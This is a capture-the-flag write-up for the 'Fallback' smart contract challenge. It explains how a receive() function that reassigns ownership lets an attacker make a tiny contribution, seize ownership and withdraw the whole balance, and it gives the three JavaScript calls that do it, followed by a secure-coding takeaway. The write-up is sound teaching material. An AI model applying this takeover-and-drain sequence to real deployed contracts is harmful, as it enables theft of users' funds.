# 1. Fallback

## Goal
Claim ownership of the contract and reduce its balance to zero.

## Vulnerability
The `receive` function reassigns ownership to anyone who sends ETH while having a non-zero recorded contribution. You can't out-contribute the owner (they start with 1000 ETH), but you can make a tiny contribution to pass the check, followed by triggering `receive` to take ownership.

## Exploit
```javascript
// contribute a small amount
await contract.contribute({ value: toWei('0.0005') })

// send ETH directly to trigger receive(), which makes you owner
await contract.sendTransaction({ value: toWei('0.0005') })

// drain the contract now that you own it
await contract.withdraw()
```

## Takeaway
Keep `receive`/`fallback` functions simple. Putting ownership changes inside a function triggered by a ETH transfer is an easy way to hand control to anyone.
